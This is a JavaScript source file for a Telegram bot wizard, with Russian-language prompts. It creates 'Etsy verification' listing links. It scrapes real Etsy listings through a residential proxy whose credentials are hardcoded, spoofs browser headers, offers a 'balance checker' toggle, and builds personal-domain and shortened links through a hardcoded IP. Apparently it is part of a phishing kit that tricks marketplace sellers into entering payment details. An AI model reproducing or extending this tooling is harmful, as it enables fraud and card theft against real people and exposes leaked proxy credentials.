const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles, MyDomains, Settings } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const downloadImage = require("../../helpers/downloadImage");
const myAd = require("../../commands/myAd");
const etsyverif_eu_domains = ["www.etsy.com", "etsy.com"];

const scene = new WizardScene(
  "create_link_etsyverif_eu",
  async (ctx) => {
    try {
      const service = await Service.findOne({ where: { code: "etsyverif_eu" } });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.wizard.state.code = ctx.match[1];
      log(ctx, "перешёл к созданию ссылки ETSY.COM (Вериф)");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene.reply("Выбери способ генерации ссылки:", {
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton("Ручной", "default"),
            // Markup.callbackButton("Парсер", "parser"),
          ],
          [Markup.callbackButton("Atom", "etsy_verif_atom_parser")],

          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      // Если пользователь ввёл текст, а не нажал кнопку
      if (!ctx.callbackQuery) {
        await ctx.scene.reply("❌ Пожалуйста, выбери способ генерации ссылки:", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Ручной", "default"),
              // Markup.callbackButton("Парсер", "parser"),
            ],
          [Markup.callbackButton("Atom", "etsy_verif_atom_parser")],

            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        }).catch(() => { });
        return; // не переходим на следующий шаг
      }
      if (ctx.callbackQuery.data === "etsy_verif_atom_parser") {
        await ctx.deleteMessage().catch((err) => err);
        return ctx.scene.enter("etsy_verif_atom_parser");
      }

      ctx.wizard.state.typeCreate = ctx.callbackQuery.data;

      if (ctx.callbackQuery.data === "parser") {
        await ctx.scene.reply("Отправьте ссылку на объявление etsy.com", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      } else {
        await ctx.scene.reply("Введите название объявления", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      }

      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      if (ctx.wizard.state.typeCreate === "parser") {
        if (!ctx.message?.text) {
          await ctx.scene.reply("❌ Введите ссылку на объявление etsy.com", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Отменить", "cancel")]
            ])
          }).catch((err) => err);
          return;
        }

        let url;
        try {
          url = new URL(ctx.message.text);
        } catch {
          await ctx.scene.reply("❌ Введите валидную ссылку", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Отменить", "cancel")]
            ])
          }).catch((err) => err);
          return;
        }

        if (!etsyverif_eu_domains.includes(url.host)) {
          await ctx.scene.reply("❌ Введите ссылку на объявление etsy.com", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Отменить", "cancel")]
            ])
          }).catch((err) => err);
          return;
        }

        log(ctx, `отправил ссылку для парсинга ETSY.COM (Вериф) (${url.href})`);
        await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);

        const SocksProxyAgent = require("socks-proxy-agent");
        const proxy = "socks://T72BY2CQWJ-country-de-sid-oafan49jz7mx-filter-medium:QU0E60JV8E@resident.proxyshard.com:2080";
        const torProxyAgent = new SocksProxyAgent(proxy);

        const userAgents = [
          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
          "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
        ];
        const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

        let ad;
        try {
          ad = await axios.get(encodeURI(url.href), {
            httpsAgent: torProxyAgent,
            httpAgent: torProxyAgent,
            headers: {
              "User-Agent": randomUserAgent,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
              "Accept-Encoding": "gzip, deflate, br",
              "Accept-Language": "en-US,en;q=0.9",
              "Referer": "https://www.etsy.com/",
              "Connection": "keep-alive",
              "Upgrade-Insecure-Requests": "1",
              "DNT": "1",
              "Sec-Fetch-Dest": "document",
              "Sec-Fetch-Mode": "navigate",
              "Sec-Fetch-Site": "same-origin",
              "Sec-Fetch-User": "?1",
              "Viewport-Width": "390",
              "Time-Zone": "Europe/Bucharest",
            }
          });
        } catch (err) {
          console.error("Ошибка при запросе страницы:", err.message);
          await ctx.scene.reply("❌ Не удалось загрузить объявление. Возможно, проблема с прокси или ссылкой.").catch(() => { });
          return ctx.scene.leave();
        }

        const $ = cheerio.load(ad.data);
        const info = {
          title: $('h1[data-buy-box-listing-title="true"]').text().trim() || null,
          price: $('div[data-selector="price-only"] p.wt-text-title-larger').text().trim().replace("Price:", "").trim() || null,
          adLink: url.href
        };

        try {
          info.photo = $('[property="og:image"]').first().attr("content") || null;
        } catch (err) {
          console.error("Ошибка при парсинге изображения:", err);
        }

        if (!info.title || !info.price) {
          await ctx.scene.reply("❌ Не удалось спарсить объявление").catch((err) => err);
          return ctx.scene.leave();
        }

        log(ctx, `спарсил объявление ETSY.COM (Вериф) (${url.href})`);
        ctx.scene.state.data = info;

        await ctx.scene.reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false")
            ],
            [Markup.callbackButton("Отменить", "cancel")]
          ])
        });

        return ctx.wizard.selectStep(6);
      } else {
        ctx.scene.state.data.title = escapeHTML(ctx.message.text);
        await ctx.scene.reply("Отправьте изображение в сжатом формате", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Пропустить", "skip")],
            [Markup.callbackButton("Отменить", "cancel")]
          ])
        });
        return ctx.wizard.selectStep(5);
      }
    } catch (err) {
      console.error("Глобальная ошибка в сцене:", err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {

      await ctx.scene.reply("Чекер баланса", {
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton("Включить", "true"),
            Markup.callbackButton("Выключить", "false"),
          ],
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.message?.photo?.length < 1 && ctx.callbackQuery?.data !== "skip")
        return ctx.reply("Ошибка");
      if (!ctx.callbackQuery) {
        const photo_link = await ctx.telegram.getFileLink(ctx.message.photo[1].file_id);
        ctx.wizard.state.data.photo = await downloadImage(photo_link);
      } else {
        ctx.wizard.state.data.photo = null;
      }
      await ctx.scene.reply("Чекер баланса", {
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton("Включить", "true"),
            Markup.callbackButton("Выключить", "false"),
          ],
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery?.data)) return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";


      const service = await Service.findOne({ where: { code: ctx.wizard.state.code } });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }

      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        version: "0",
        ...ctx.scene.state.data,
        serviceCode: ctx.wizard.state.code,
      });

      const domains = await MyDomains.findOne({
        where: { userId: ctx.from.id },
      });

      let reductionUrl;

      try {
        const reduction = await axios.post(
          "http://185.208.158.144/api/create",
          {
            target: `https://${service.domain}/${ad.id}`,
            domain: service.shortlink || ctx.state.bot.shortlink,
          },
          { timeout: 2000 }
        );

        reductionUrl = reduction.data.url;
      } catch (error) {
        console.error("Ошибка при создании сокращенной ссылки:", error.message);

        if (error.code === 'ECONNABORTED') {
          console.warn("Запрос превысил допустимый тайм-аут.");
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') {
          console.warn("Сервер сокращений недоступен.");
        } else {
          console.warn("Произошла непредвиденная ошибка:", error.message);
        }

        reductionUrl = null; // корректный fallback 
      }

      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null;

      await ad.update({
        myDomainLink: personalDomainLink,
        shortLink: reductionUrl, // используем переменную 
      });

      log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`);

      // Собираем сообщение 
      try {
        await myAd(ctx, ad.id);
      } catch (err) {
        await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => { });
      }
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  }
);

module.exports = scene;
